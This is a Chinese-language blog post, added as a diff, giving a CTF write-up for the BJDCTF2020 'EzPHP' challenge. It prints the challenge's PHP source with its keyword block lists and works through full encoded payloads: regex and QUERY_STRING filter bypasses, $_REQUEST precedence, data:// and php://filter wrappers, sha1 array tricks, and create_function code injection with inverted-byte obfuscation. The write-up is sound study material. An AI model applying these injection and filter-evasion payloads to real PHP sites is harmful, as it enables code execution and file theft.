@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>BJDCTF2020——EzPHP | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BJDCTF2020——EzPHP</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 30, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/buu%E5%88%B7%E9%A2%98/">buu刷题</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>本地复现一下<br>复现地址：<a href="https://github.com/BjdsecCA/BJDCTF2020_January" target="_blank" rel="noopener">https://github.com/BjdsecCA/BJDCTF2020_January</a><br>打开靶机来自卡巴斯基网络威胁实时地图，控制台查看源码发现base32，解码得1nD3x.php<br><img src="https://img-blog.csdnimg.cn/20200630103318121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure>
+<p>有很多匹配和过滤，一层层看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配了很多必需的关键词，但可以对传入的字符串的进行url编码绕过，因为<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>并不会对字符串url解码，但get传入之后是会解码的，所以可行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure>
+<p>禁用http/https协议，第二个if要求<code>debu=aqua_is_cute</code>但又匹配了<code>aqua_is_cute</code>，由于<code>preg_match</code>只匹配第一行，在句尾加上%0a即可绕过<br><img src="https://img-blog.csdnimg.cn/20200630105739618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>遍历<code>$_REQUEST</code>传递给<code>$value</code>，匹配<code>$value</code>中的大小写字母，这里考察了<code>$_REQUEST</code>的优先级特性，<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值，php的配置文件中做出了说明。<br><img src="https://img-blog.csdnimg.cn/20200630110638839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再post一个debu即可绕过。<br><img src="https://img-blog.csdnimg.cn/20200630111805511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br></pre></td></tr></table></figure>
+<p>file_get_contents函数，用data协议写入绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求<code>$shana</code>和<code>$passwd</code>的sha1相等但他们本身不相等，sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False，因此如果<code>$shana</code>和<code>$passwd</code>都为数组，都返回false，就满足条件了.<br>把目前的payloaod整理一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get：data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class="line">post：file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>url编码传入测试<br><img src="https://img-blog.csdnimg.cn/2020063014542772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么接着看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配了很多关键字和函数，但<code>$code</code>和<code>$arg</code>都可控，可以利用<code>$code(&#39;&#39;, $arg);</code>进行create_function注入<br>构造<code>flag[code]=create_function&amp;flag[arg]=}代码函数;//</code><br>这样就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">(<span class="string">''</span>,$arg)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而<code>$arg</code>为<code>}代码函数;//</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">(<span class="string">''</span>,$arg)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> &#125;代码函数;<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>}</code>提前闭合了a()，后面注释把后面的内容又去掉了，因此可以在<code>}</code>和<code>；</code>中间执行恶意代码<br>那么现在考虑得flag.php</p>
+<blockquote>
+<p>get_defined_vars()用来输出所有变量和值</p>
+</blockquote>
+<p>构造<code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code><br>同样base64编码传入测试<br><code>?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</code><br><img src="https://img-blog.csdnimg.cn/20200630142425306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得知真正的flag在rea1fl4g.php<br>那么现在就是读取这个文件了<br><code>require</code>代替被过滤的<code>include</code>，<code>require()</code>代替<code>require &quot;&quot;</code>，所以可以这样构造<br><code>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</code><br>同样url编码后传入<br>由于关键字过滤，我们取反绕过，于是<br><code>require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))</code><br>传入<br><img src="https://img-blog.csdnimg.cn/20200630144125316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码得真的flag<br><img src="https://img-blog.csdnimg.cn/20200630144205341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/06/30/buu18%E2%80%94%E2%80%94[BJDCTF2020]EzPHP/">http://www.blacknight.top/2020/06/30/buu18%E2%80%94%E2%80%94[BJDCTF2020]EzPHP/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/07/03/BJD2020_web_wp/">BJDCTF2020web复现</a>
+            
+            
+            <a class="next" rel="next" href="/2020/06/30/buu5%E2%80%94%E2%80%94%5B0CTF%202016%5Dpiapiapia/">BJDCTF2020——EzPHP</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
